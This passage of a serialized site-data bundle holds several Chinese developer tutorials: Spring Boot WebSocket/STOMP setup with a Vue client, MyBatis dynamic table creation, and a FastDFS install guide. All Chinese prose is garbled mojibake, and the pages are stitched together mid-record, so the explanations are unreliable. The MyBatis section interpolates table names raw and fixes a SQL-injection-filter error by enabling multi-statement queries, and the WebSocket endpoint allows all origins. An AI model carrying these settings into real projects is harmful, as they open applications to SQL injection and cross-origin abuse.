}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\nè¿æ¥éäºä»¥åï¼å¦æè¯´åç«¯ç¨ websocket åªæ¯ä¸ºäºæ¥æ¶åç«¯çæ¶æ¯ï¼é£ä¹å³äº topic å¯ä»¥éä¾¿è®¾ç½®ï¼è¿éçéä¾¿æææ¯åç«¯ä¸éè¦å»å¨ configureMessageBroker éè®¾ç½®ä»»ä½ä¸è¥¿ï¼åªéè¦ååç«¯å®ä¹æ¸æ¥ topicï¼åç«¯å¯ä»¥å¨æ topic ç»åç«¯ãå¦ä¸ï¼\n\n\n\n\n\n',normalizedContent:'# åç«¯ä»£ç \n\nä¾èµ\n\n<dependency>\n    <groupid>org.springframework.boot</groupid>\n    <artifactid>spring-boot-starter-websocket</artifactid>\n</dependency>\n\n\n1\n2\n3\n4\n\n\nimport org.springframework.context.annotation.configuration;\nimport org.springframework.messaging.simp.config.messagebrokerregistry;\nimport org.springframework.web.socket.config.annotation.enablewebsocketmessagebroker;\nimport org.springframework.web.socket.config.annotation.stompendpointregistry;\nimport org.springframework.web.socket.config.annotation.websocketmessagebrokerconfigurer;\n\n/**\n * éè¿enablewebsocketmessagebroker å¼å¯ä½¿ç¨stompåè®®æ¥ä¼ è¾åºäºä»£ç(message broker)çæ¶æ¯,æ­¤æ¶æµè§å¨æ¯æä½¿ç¨@messagemapping å°±åæ¯æ@requestmappingä¸æ ·ã\n * @author zhenghuasheng\n */\n@configuration\n@enablewebsocketmessagebroker\npublic class websocketconfig implements websocketmessagebrokerconfigurer {\n\n    /**\n     * æ³¨åstompçç«¯ç¹\n     */\n    @override\n    public void registerstompendpoints(stompendpointregistry registry) {\n        // ç¨æ·è®¢éä¸»é¢çåç¼ /topic ä»£è¡¨åå¸å¹¿æ­ï¼å³ç¾¤å /queue ä»£è¡¨ç¹å¯¹ç¹ï¼å³åæå®ç¨æ·\n        registry.addendpoint("/websocket")\n                // è®¾ç½®è·¨å\n                .setallowedorigins("*")\n                //æ·»å socketæ¦æªå¨ï¼ç¨äºä»è¯·æ±ä¸­è·åå®¢æ·ç«¯æ è¯åæ° ç®åæ²¡ä»ä¹ç¨ï¼å¯ä»¥å»æ\n                .addinterceptors(new myhandshakeinterceptor())\n                .withsockjs();\n    }\n\n    /**\n     * éç½®æ¶æ¯ä»£ç(message broker)\n     * @param registry\n     */\n    @override\n    public void configuremessagebroker(messagebrokerregistry registry) {\n//        threadpooltaskscheduler te = new threadpooltaskscheduler();\n//        te.setpoolsize(1);\n//        te.setthreadnameprefix("wss-heartbeat-thread-");\n//        te.initialize();\n        // ä»£çç¨ä¸å°\n//        registry.enablestompbrokerrelay().setclientlogin("111").setclientpasscode("111").setrelayport(8005);\n        // è®¢ébrokeråç§°\n        registry.enablesimplebroker("/queue","/topic")\n                // ç¬¬ä¸ä¸ªåæ°è¡¨ç¤ºæå¡å¨åå¥æåéå¿è·³çé¢çã ç¬¬äºä¸ªåæ°è¡¨ç¤ºå®¢æ·ç«¯åéå¿è·³æ¶é´\n//                .setheartbeatvalue(new long[]{15000,3000})\n//                .settaskscheduler(te)\n        ;\n        // å¨å±ä½¿ç¨çæ¶æ¯åç¼ï¼å®¢æ·ç«¯è®¢éè·¯å¾ä¸ä¼ä½ç°åºæ¥ï¼\n//        registry.setapplicationdestinationprefixes("/app");\n        // ç¹å¯¹ç¹ä½¿ç¨çè®¢éåç¼ï¼å®¢æ·ç«¯è®¢éè·¯å¾ä¸ä¼ä½ç°åºæ¥ï¼ï¼ä¸è®¾ç½®çè¯ï¼é»è®¤ä¹æ¯/user/\n        // registry.setuserdestinationprefix("/user/");\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n\n\n\n# åç«¯ä»£ç \n\nä¾èµ\n\nnpm install sockjs-client\nnpm install stompjs\nnpm install net\nnpm install vue-stomp\n\n\n1\n2\n3\n4\n\n\nå°è£ stomp.js\n\nimport sockjs from \'sockjs-client\'\nimport stomp from \'webstomp-client\'\n\nexport default {\n  // æ¯å¦å¯ç¨æ¥å¿ é»è®¤å¯ç¨\n  debug:true,\n  // å®¢æ·ç«¯è¿æ¥ä¿¡æ¯\n  stompclient:{},\n  // åå§å\n  init(callback){\n    const socket = new sockjs(\'http://127.0.0.1:8005/websocket\')\n    this.stompclient = stomp.over(socket)\n    this.stompclient.hasdebug = this.debug\n    this.stompclient.connect({},suce =>{\n      this.console("è¿æ¥æå,ä¿¡æ¯å¦ä¸ â");\n      this.console(this.stompclient);\n      if(callback){\n        callback();\n      }\n    },err => {\n      if(err) {\n        this.console("è¿æ¥å¤±è´¥,ä¿¡æ¯å¦ä¸ â")\n        this.console(err)\n      }\n    });\n  },\n  // è®¢é\n  sub(address,callback){\n    if(!this.stompclient.connected){\n      this.console("æ²¡æè¿æ¥,æ æ³è®¢é");\n      return;\n    }\n    // çæ id\n    let timestamp= new date().gettime() + address\n    this.console("è®¢éæå -> "+address)\n    this.stompclient.subscribe(address,message => {\n      this.console(address+" è®¢éæ¶æ¯éç¥,ä¿¡æ¯å¦ä¸ â")\n      this.console(message)\n      let data = message.body;\n      callback(data);\n    },{\n      id: timestamp\n    })\n  },\n  unsub(address){\n    if(!this.stompclient.connected){\n      this.console("æ²¡æè¿æ¥,æ æ³åæ¶è®¢é -> "+address);\n      return;\n    }\n    let id = ""\n    for(let item in this.stompclient.subscriptions){\n      if(item.endswith(address)){\n        id = item;\n        break;\n      }\n    }\n    this.stompclient.unsubscribe(id);\n    this.console("åæ¶è®¢éæå -> id:"+ id + " address:"+address)\n  },\n  // æ­å¼è¿æ¥\n  disconnect(callback){\n    if(!this.stompclient.connected){\n      this.console("æ²¡æè¿æ¥,æ æ³æ­å¼è¿æ¥");\n      return;\n    }\n    this.stompclient.disconnect(() =>{\n      console.log("æ­å¼æå")\n      if(callback){\n        callback()\n      }\n    });\n  },\n  // åä½ ç§\n  reconnect(time){\n    setinterval(() =>{\n      if(!this.stompclient.connected){\n        this.console("éæ°è¿æ¥ä¸­...")\n        this.init()\n      }\n    },time * 1000)\n  },\n  console(msg){\n    if(this.debug){\n      console.log(msg);\n    }\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n\n\nä»¥ä¸æ¯æèªå·±å°è£çä¸ä¸ª stomp.jsï¼å»ºè®®å¨ç»å½ä¹åè°ç¨ initï¼å¹¶ä¸ä¿è¯ è®¢é å init ç­ææ api å¨ä¸ä¸ªæä»¶ä¸­ä½¿ç¨ï¼å¦åä¼ undefinedãå¯ä»¥ä½¿ç¨ eventbus æ¥ä¼ éæ°æ®ã\n\nå·ä½ä½¿ç¨\n\n  mounted() {\n    // åå§å\n    stomp.init(() =>{\n      // åå§åæå å°±æ§è¡è®¢é\n      stomp.sub("/topic",data =>{\n        console.log(data)\n      })\n      stomp.sub("/topic1",data =>{\n        console.log(data)\n      })\n      // åæ¶è®¢é\n      stomp.unsub("/topic")\n    })\n    //  å¯ç¨éè¿ 5ç§æ£æµä¸æ¬¡\n    stomp.reconnect(5)\n  },\n  destroyed() {\n    stomp.disconnect()\n  }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\nè¿æ¥éäºä»¥åï¼å¦æè¯´åç«¯ç¨ websocket åªæ¯ä¸ºäºæ¥æ¶åç«¯çæ¶æ¯ï¼é£ä¹å³äº topic å¯ä»¥éä¾¿è®¾ç½®ï¼è¿éçéä¾¿æææ¯åç«¯ä¸éè¦å»å¨ configuremessagebroker éè®¾ç½®ä»»ä½ä¸è¥¿ï¼åªéè¦ååç«¯å®ä¹æ¸æ¥ topicï¼åç«¯å¯ä»¥å¨æ topic ç»åç«¯ãå¦ä¸ï¼\n\n\n\n\n\n',charsets:{cjk:!0}},{title:"SpringBoot MyBatis å¨æå»ºè¡¨",frontmatter:{title:"SpringBoot MyBatis å¨æå»ºè¡¨",date:"2023-06-25T09:22:36.000Z",permalink:"/spring/spring-boot/204/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E6%A1%86%E6%9E%B6/01.Spring/03.spring%20boot/204.SpringBoot%20MyBatis%20%E5%8A%A8%E6%80%81%E5%BB%BA%E8%A1%A8.html",relativePath:"01.æ¡æ¶/01.Spring/03.spring boot/204.SpringBoot MyBatis å¨æå»ºè¡¨.md",key:"v-07e31ee4",path:"/spring/spring-boot/204/",lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:null,content:'ä»£ç \n\n    <update  id="createTelemetryTable" parameterType="java.util.List">\n        <foreach item="item" index="index" collection="list">\n            CREATE TABLE if not exists `${item}` (\n                sys_id bigint NOT NULL,\n                mpnt_id bigint NOT NULL,\n                date_time datetime NOT NULL,\n                value_id DECIMAL(10,2) NOT NULL\n            ) ENGINE=MYISAM DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;\n        </foreach>\n    </update>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\næ¥é\n\nCaused by: java.sql.SQLException: sql injection violation, multi-statement not allow : CREATE TABLE if not exists `rt_telemetry_p` (\n                sys_id bigint NOT NULL,\n                mpnt_id bigint NOT NULL,\n                date_time datetime NOT NULL,\n                value_id DECIMAL(10,2) NOT NULL\n            ) ENGINE=MYISAM DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;\n\n\n1\n2\n3\n4\n5\n6\n\n\nè§£å³æ¿å¨ï¼å¨ yml é æ°æ®åºè¿æ¥ url ä¸­å å¥ allowMultiQueries=true ï¼å¨ yml é druid éç½®ä¸­å å¥\n\nwall:\n    multi-statement-allow: true\n\n\n1\n2\n',normalizedContent:'ä»£ç \n\n    <update  id="createtelemetrytable" parametertype="java.util.list">\n        <foreach item="item" index="index" collection="list">\n            create table if not exists `${item}` (\n                sys_id bigint not null,\n                mpnt_id bigint not null,\n                date_time datetime not null,\n                value_id decimal(10,2) not null\n            ) engine=myisam default charset=utf8mb4 collate=utf8mb4_unicode_ci;\n        </foreach>\n    </update>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\næ¥é\n\ncaused by: java.sql.sqlexception: sql injection violation, multi-statement not allow : create table if not exists `rt_telemetry_p` (\n                sys_id bigint not null,\n                mpnt_id bigint not null,\n                date_time datetime not null,\n                value_id decimal(10,2) not null\n            ) engine=myisam default charset=utf8mb4 collate=utf8mb4_unicode_ci;\n\n\n1\n2\n3\n4\n5\n6\n\n\nè§£å³æ¿å¨ï¼å¨ yml é æ°æ®åºè¿æ¥ url ä¸­å å¥ allowmultiqueries=true ï¼å¨ yml é druid éç½®ä¸­å å¥\n\nwall:\n    multi-statement-allow: true\n\n\n1\n2\n',charsets:{cjk:!0}},{title:"Spring Boot éæ FastDFS",frontmatter:{title:"Spring Boot éæ FastDFS",date:"2023-06-25T09:22:36.000Z",permalink:"/spring/spring-boot/206/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E6%A1%86%E6%9E%B6/01.Spring/03.spring%20boot/206.Spring%20Boot%20%E9%9B%86%E6%88%90%20FastDFS.html",relativePath:"01.æ¡æ¶/01.Spring/03.spring boot/206.Spring Boot éæ FastDFS.md",key:"v-d16f8084",path:"/spring/spring-boot/206/",headers:[{level:2,title:"å®è£FastDFS",slug:"å®è£fastdfs",normalizedTitle:"å®è£ fastdfs",charIndex:2},{level:3,title:"ç³»ç»è½¯ä»¶",slug:"ç³»ç»è½¯ä»¶",normalizedTitle:"ç³»ç»è½¯ä»¶",charIndex:17},{level:3,title:"ç¼è¯ç¯å¢",slug:"ç¼è¯ç¯å¢",normalizedTitle:"ç¼è¯ç¯å¢",charIndex:238},{level:3,title:"ç£çç®å½",slug:"ç£çç®å½",normalizedTitle:"ç£çç®å½",charIndex:1452},{level:3,title:"å®è£libfastcommon",slug:"å®è£libfastcommon",normalizedTitle:"å®è£ libfastcommon",charIndex:1589},{level:3,title:"å®è£FastDFS",slug:"å®è£fastdfs-2",normalizedTitle:"å®è£ fastdfs",charIndex:2},{level:3,title:"å®è£fastdfs-nginx-module",slug:"å®è£fastdfs-nginx-module",normalizedTitle:"å®è£ fastdfs-nginx-module",charIndex:2226},{level:2,title:"åæºé¨ç½²",slug:"åæºé¨ç½²",normalizedTitle:"åæºé¨ç½²",charIndex:2573},{level:3,title:"trackeréç½®",slug:"trackeréç½®",normalizedTitle:"tracker éç½®",charIndex:2582},{level:3,title:"storageéç½®",slug:"storageéç½®",normalizedTitle:"storage éç½®",charIndex:2776},{level:3,title:"å¯å¨",slug:"å¯å¨",normalizedTitle:"å¯å¨",charIndex:3084},{level:4,title:"tracker",slug:"tracker",normalizedTitle:"tracker",charIndex:1907},{level:4,title:"storage",slug:"storage",normalizedTitle:"storage",charIndex:1963},{level:3,title:"clientæµè¯",slug:"clientæµè¯",normalizedTitle:"client æµè¯",charIndex:3493},{level:3,title:"nginx éç½®è®¿é®",slug:"nginx-éç½®è®¿é®",normalizedTitle:"nginx éç½®è®¿é®",charIndex:3962},{level:2,title:"åå¸å¼é¨ç½²",slug:"åå¸å¼é¨ç½²",normalizedTitle:"åå¸å¼é¨ç½²",charIndex:5235},{level:3,title:"storageéç½®",slug:"storageéç½®-2",normalizedTitle:"storage éç½®",charIndex:2776},{level:3,title:"clientæµè¯",slug:"clientæµè¯-2",normalizedTitle:"client æµè¯",charIndex:3493},{level:3,title:"éç½®nginxè®¿é®",slug:"éç½®nginxè®¿é®",normalizedTitle:"éç½® nginx è®¿é®",charIndex:6038},{level:2,title:"éæSpringBoot",slug:"éæspringboot",normalizedTitle:"éæ springboot",charIndex:6662},{level:3,title:"å¼å¥ä¾èµ",slug:"å¼å¥ä¾èµ",normalizedTitle:"å¼å¥ä¾èµ",charIndex:6680},{level:3,title:"æ·»å éç½®",slug:"æ·»å éç½®",normalizedTitle:"æ·»å éç½®",charIndex:6845},{level:3,title:"Controller",slug:"controller",normalizedTitle:"controller",charIndex:7005},{level:3,title:"å®ç°",slug:"å®ç°",normalizedTitle:"å®ç°",charIndex:7317}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"å®è£FastDFS ç³»ç»è½¯ä»¶ ç¼è¯ç¯å¢ ç£çç®å½ å®è£libfastcommon å®è£FastDFS å®è£fastdfs-nginx-module åæºé¨ç½² trackeréç½® storageéç½® å¯å¨ tracker storage clientæµè¯ nginx éç½®è®¿é® åå¸å¼é¨ç½² storageéç½® clientæµè¯ éç½®nginxè®¿é® éæSpringBoot å¼å¥ä¾èµ æ·»å éç½® Controller å®ç°",content:'# å®è£ FastDFS\n\n\n# ç³»ç»è½¯ä»¶\n\nåç§°                     è¯´æ\ncentos                 7.x\nlibfastcommon          FastDFS åç¦»åºçä¸äºå¬ç¨å½æ°å\nFastDFS                FastDFS æ¬ä½\nfastdfs-nginx-module   FastDFS å nginx çå³èæ¨¡å\nnginx                  nginx-1.18.0\n\n\n# ç¼è¯ç¯å¢\n\nyum install git gcc gcc-c++ make automake autoconf libtool pcre pcre-devel zlib zlib-devel openssl-devel wget vim -y\n\n\n1\n\n\nå¦æåºç°ä»¥ä¸éè¯¯\n\nLoaded plugins: fastestmirror\nLoading mirror speeds from cached hostfile\n * base: mirrors.cn99.com\n * centos-sclo-rh: mirrors.cn99.com\n * centos-sclo-sclo: mirrors.ustc.edu.cn\n * epel: ftp.yz.yamagata-u.ac.jp\n * extras: mirrors.cn99.com\n * updates: mirrors.cn99.com\n  File "/usr/libexec/urlgrabber-ext-down", line 28\n    except OSError, e:\n                  ^\nSyntaxError: invalid syntax\n  File "/usr/libexec/urlgrabber-ext-down", line 28\n    except OSError, e:\n                  ^\nSyntaxError: invalid syntax\n  File "/usr/libexec/urlgrabber-ext-down", line 28\n    except OSError, e:\n                  ^\nSyntaxError: invalid syntax\n  File "/usr/libexec/urlgrabber-ext-down", line 28\n    except OSError, e:\n                  ^\nSyntaxError: invalid syntax\n  File "/usr/libexec/urlgrabber-ext-down", line 28\n    except OSError, e:\n                  ^\nSyntaxError: invalid syntax\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\nä¿®æ¹å¦ä¸æä»¶\n\nvi /usr/libexec/urlgrabber-ext-down\n#æç¬¬ä¸è¡ç\n#!/usr/bin/python\n\n#ä¿®æ¹ä¸ºï¼ç¶åéæ°å®è£\n#!/usr/bin/python2\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# ç£çç®å½\n\nè¯´æ                  ä½ç½®\nææå®è£å               /home/dfs/lib\næ°æ®å­å¨ä½ç½®              /home/dfs/store\nè¿éæä¸ºäºæ¹ä¾¿ææ¥å¿ä»ä¹çé½æ¾å°äº   /home/dfs/log\n\n\n# å®è£ libfastcommon\n\ngit clone https://github.com/happyfish100/libfastcommon.git --depth 1\ncd libfastcommon/\n./make.sh && ./make.sh install #ç¼è¯å®è£\n\n\n1\n2\n3\n\n\n\n# å®è£ FastDFS\n\ncd ../ #è¿åä¸ä¸çº§ç®å½\ngit clone https://github.com/happyfish100/fastdfs.git --depth 1\ncd fastdfs/\n./make.sh && ./make.sh install #ç¼è¯å®è£\n#éç½®æä»¶åå¤\ncp /etc/fdfs/tracker.conf.sample /etc/fdfs/tracker.conf\ncp /etc/fdfs/storage.conf.sample /etc/fdfs/storage.conf\ncp /etc/fdfs/client.conf.sample /etc/fdfs/client.conf #å®¢æ·ç«¯æä»¶ï¼æµè¯ç¨\ncp /home/dfs/lib/fastdfs/conf/http.conf /etc/fdfs/ #ä¾nginxè®¿é®ä½¿ç¨\ncp /home/dfs/lib/fastdfs/conf/mime.types /etc/fdfs/ #ä¾nginxè®¿é®ä½¿ç¨\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# å®è£ fastdfs-nginx-module\n\ncd ../ #è¿åä¸ä¸çº§ç®å½\ngit clone https://github.com/happyfish100/fastdfs-nginx-module.git --depth 1\ncp /home/dfs/lib/fastdfs-nginx-module/src/mod_fastdfs.conf /etc/fdfs\n\n\n1\n2\n3\n\n\néå nginx ä½¿ç¨ï¼å³äº nginx å®è£è¿éå°±ä¸è¯´äºï¼å®è£å nginx éè¦éç½®å¦ä¸ï¼\n\n./configure --prefix=/home/nginx-1.18.0 --add-module=/home/dfs/lib/fastdfs-nginx-module/src\n\n\n1\n\n\n\n# åæºé¨ç½²\n\n\n# tracker éç½®\n\n#æå¡å¨ipä¸º 10.24x.3x.xx2\n#æå»ºè®®ç¨ftpä¸è½½ä¸æ¥è¿äºæä»¶ æ¬å°ä¿®æ¹\nvim /etc/fdfs/tracker.conf\n#éè¦ä¿®æ¹çåå®¹å¦ä¸\nport=22122  # trackeræå¡å¨ç«¯å£ï¼é»è®¤22122,ä¸è¬ä¸ä¿®æ¹ï¼\nbase_path=/home/dfs/log  # å­å¨æ¥å¿åæ°æ®çæ ¹ç®å½\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# storage éç½®\n\nvim /etc/fdfs/storage.conf\n#éè¦ä¿®æ¹çåå®¹å¦ä¸\nport=23000  # storageæå¡ç«¯å£ï¼é»è®¤23000,ä¸è¬ä¸ä¿®æ¹ï¼\nbase_path=/home/dfs/log  # æ°æ®åæ¥å¿æä»¶å­å¨æ ¹ç®å½\nstore_path0=/home/dfs/store  # ç¬¬ä¸ä¸ªå­å¨ç®å½\ntracker_server=10.24x.3x.xx2:22122  # trackeræå¡å¨IPåç«¯å£\nhttp.server_port=8888  # httpè®¿é®æä»¶çç«¯å£(é»è®¤8888,çæåµä¿®æ¹,ånginxä¸­ä¿æä¸è´)\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# å¯å¨\n\n# tracker\n\n/etc/init.d/fdfs_trackerd start #å¯å¨trackeræå¡\n/etc/init.d/fdfs_trackerd restart #éå¯å¨trackeræå¡\n/etc/init.d/fdfs_trackerd stop #åæ­¢trackeræå¡\nchkconfig fdfs_trackerd on #èªå¯å¨trackeræå¡\n\n\n1\n2\n3\n4\n\n\n# storage\n\n/etc/init.d/fdfs_storaged start #å¯å¨storageæå¡\n/etc/init.d/fdfs_storaged restart #éå¨storageæå¡\n/etc/init.d/fdfs_storaged stop #åæ­¢å¨storageæå¡\nchkconfig fdfs_storaged on #èªå¯å¨storageæå¡\n\n\n1\n2\n3\n4\n\n\n\n# client æµè¯\n\nè¿å groupX ææå°±æ¯æåäºï¼æä»¶è¢«éæ°æ¹åå­å¹¶ä¸è¢«æ¾å¨äºæä¸ªå°æ¹\n\nvim /etc/fdfs/client.conf\n#éè¦ä¿®æ¹çåå®¹å¦ä¸\nbase_path=/home/dfs/log\ntracker_server=10.24x.3x.xx2:22122    #trackeræå¡å¨IPåç«¯å£\n\n[root@node102 home]# fdfs_upload_file /etc/fdfs/client.conf /home/start.sh \ngroup1/M00/00/00/CvAeZl_R4uSAfHXSAAACUyTz3No8807.sh\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\nä¸ç¥éå¯ä»¥ç¨ä»¥ä¸å½ä»¤æ¥ææ¾\n\n[root@node102 home]# find / -name CvAeZl_R4uSAfHXSAAACUyTz3No8807.sh\n/home/dfs/store/data/00/00/CvAeZl_R4uSAfHXSAAACUyTz3No8807.sh\n\n\n1\n2\n\n\n\n# nginx éç½®è®¿é®\n\nvim /etc/fdfs/mod_fastdfs.conf\n#éè¦ä¿®æ¹çåå®¹å¦ä¸\ntracker_server=10.24x.3x.xx2:22122  #trackeræå¡å¨IPåç«¯å£\nurl_have_group_name=true\nstore_path0=/home/dfs/store\n#éç½®nginx.config\nvim /home/nginx-1.18.0/conf/nginx.conf\n#æ·»å å¦ä¸éç½®\nserver {\n    listen       8888;    ## è¯¥ç«¯å£ä¸ºstorage.confä¸­çhttp.server_portç¸å\n    server_name  localhost;\n    location ~/group[0-9]/ {\n        ngx_fastdfs_module;\n    }\n    error_page   500 502 503 504  /50x.html;\n    location = /50x.html {\n    root   html;\n    }\n}\n# åæ8888ç«¯å£æå¼\n/sbin/iptables -I INPUT -p tcp --dport 8888 -j ACCEPT\n#æµè¯ä¸è½½ï¼ç¨å¤é¨æµè§å¨è®¿é®åæå·²ä¼ è¿çnginxå®è£å,å¼ç¨è¿åçID\nhttp://10.24x.3x.xx2:8888/group1/M00/00/00/CvAeZl_R4uSAfHXSAAACUyTz3No8807.sh\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\nå¦æ nginx å¯å¨ unknown directive "ngx_fastdfs_module"ï¼åæ¯å®è£ nginx --add-module=/home/dfs/lib/fastdfs-nginx-module/src å¤±è´¥ï¼å¯ä»¥ç¨./nginx -V æ¥çã\n\n[root@node102 sbin]# ./nginx -V\nnginx version: nginx/1.18.0\nbuilt by gcc 9.3.1 20200408 (Red Hat 9.3.1-2) (GCC) \nbuilt with OpenSSL 1.0.2k-fips  26 Jan 2017\nTLS SNI support enabled\nconfigure arguments: --add-module=/home/dfs/lib/fastdfs-nginx-module/src --prefix=/home/nginx-1.18.0 --with-http_stub_status_module --with-http_ssl_module --with-http_v2_module --with-pcre=/home/pcre-8.35\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# åå¸å¼é¨ç½²\n\n\n# storage éç½®\n\ntracker éç½® ååæºé¨ç½²æ¯ä¸æ ·çä¸åï¼åªéè¦æ¹å storage éç½®\n\nvim /etc/fdfs/storage.conf\n#éè¦ä¿®æ¹çåå®¹å¦ä¸\nport=23000  # storageæå¡ç«¯å£ï¼é»è®¤23000,ä¸è¬ä¸ä¿®æ¹ï¼\nbase_path=/home/dfs/log  # æ°æ®åæ¥å¿æä»¶å­å¨æ ¹ç®å½\nstore_path0=/home/dfs/store  # ç¬¬ä¸ä¸ªå­å¨ç®å½\ntracker_server=10.240.3x.xx0:22122  # æå¡å¨1\ntracker_server=10.240.3x.xx1:22122  # æå¡å¨2\ntracker_server=10.240.3x.xx2:22122  # æå¡å¨3\nhttp.server_port=8888  # httpè®¿é®æä»¶çç«¯å£(é»è®¤8888,çæåµä¿®æ¹,ånginxä¸­ä¿æä¸è´)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n# client æµè¯\n\nvim /etc/fdfs/client.conf\n#éè¦ä¿®æ¹çåå®¹å¦ä¸\nbase_path=/home/moe/dfs\ntracker_server=10.240.3x.xx0:22122  # æå¡å¨1\ntracker_server=10.240.3x.xx1:22122  # æå¡å¨2\ntracker_server=10.240.3x.xx2:22122  # æå¡å¨3\n# ä¿å­éåº\n\n[root@node102 home]# fdfs_upload_file /etc/fdfs/client.conf /home/start.sh \ngroup1/M00/00/00/CvAeZl_R4uSAfHXSAAACUyTz3No8807.sh\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# éç½® nginx è®¿é®\n\nvim /etc/fdfs/mod_fastdfs.conf\n#éè¦ä¿®æ¹çåå®¹å¦ä¸\ntracker_server=10.240.3x.xx0:22122  # æå¡å¨1\ntracker_server=10.240.3x.xx1:22122  # æå¡å¨2\ntracker_server=10.240.3x.xx2:22122  # æå¡å¨3\nurl_have_group_name=true\nstore_path0=/home/dfs/store\n#éç½®nginx.config\nvim /home/nginx-1.18.0/conf/nginx.conf\n#æ·»å å¦ä¸éç½®\nserver {\n    listen       8888;    ## è¯¥ç«¯å£ä¸ºstorage.confä¸­çhttp.server_portç¸å\n    server_name  localhost;\n    location ~/group[0-9]/ {\n        ngx_fastdfs_module;\n    }\n    error_page   500 502 503 504  /50x.html;\n    location = /50x.html {\n    root   html;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n\n# éæ SpringBoot\n\n\n# å¼å¥ä¾èµ\n\n<dependency>\n    <groupId>com.github.tobato</groupId>\n    <artifactId>fastdfs-client</artifactId>\n    <version>1.26.7</version>\n</dependency>\n\n\n1\n2\n3\n4\n5\n\n\n\n# æ·»å éç½®\n\nfdfs:\n  # è¿æ¥çè¶æ¶æ¶é´\n  connect-timeout: 3000\n  # è¯»åçè¶æ¶æ¶é´\n  so-timeout: 3000\n  #trackeræå¡æå¨çipå°ååç«¯å£å·\n  tracker-list: 10.240.3x.xx2:22122\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# Controller\n\n@RestController\n@RequestMapping("/img")\npublic class ImgController {\n\n    @Autowired\n    private ImgServer imgServer;\n\n    @PostMapping("/push")\n    public ResponseData push(@RequestParam("file") MultipartFile file){\n        return imgServer.push(file);\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n\n# å®ç°\n\n@Service\n@Slf4j\npublic class ImgServerImpl implements ImgServer {\n    @Autowired\n    FastFileStorageClient fastFileStorageClient;\n\n    @Override\n    public ResponseData<String> push(MultipartFile file) {\n        if (file.isEmpty()) {\n            return ResponseData.failureResponse(UploadFileCode.UPLOAD_FILE_CODE_1000);\n        }\n        try {\n            log.info("å¼å§ä¸ä¼  {}", file.getOriginalFilename());\n            String fileSuffix = file.getOriginalFilename().substring(file.getOriginalFilename().lastIndexOf(".")+1);\n            StorePath storePath = fastFileStorageClient.uploadFile(file.getInputStream(), file.getSize(),fileSuffix, null);\n            String path = storePath.getFullPath();\n            log.info("ä¸ä¼ æå");\n            return ResponseData.successResponse(path);\n        } catch (IOException e) {\n            log.error(e.toString(), e);\n            return ResponseData.failureResponse(UploadFileCode.UPLOAD_FILE_CODE_1001.getCode(), e.toString());\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n\n',normalizedContent:'# å®è£ fastdfs\n\n\n# ç³»ç»è½¯ä»¶\n\nåç§°                     è¯´æ\ncentos                 7.x\nlibfastcommon          fastdfs åç¦»åºçä¸äºå¬ç¨å½æ°å\nfastdfs                fastdfs æ¬ä½\nfastdfs-nginx-module   fastdfs å nginx çå³èæ¨¡å\nnginx                  nginx-1.18.0\n\n\n# ç¼è¯ç¯å¢\n\nyum install git gcc gcc-c++ make automake autoconf libtool pcre pcre-devel zlib zlib-devel openssl-devel wget vim -y\n\n\n1\n\n\nå¦æåºç°ä»¥ä¸éè¯¯\n\nloaded plugins: fastestmirror\nloading mirror speeds from cached hostfile\n * base: mirrors.cn99.com\n * centos-sclo-rh: mirrors.cn99.com\n * centos-sclo-sclo: mirrors.ustc.edu.cn\n * epel: ftp.yz.yamagata-u.ac.jp\n * extras: mirrors.cn99.com\n * updates: mirrors.cn99.com\n  file "/usr/libexec/urlgrabber-ext-down", line 28\n    except oserror, e:\n                  ^\nsyntaxerror: invalid syntax\n  file "/usr/libexec/urlgrabber-ext-down", line 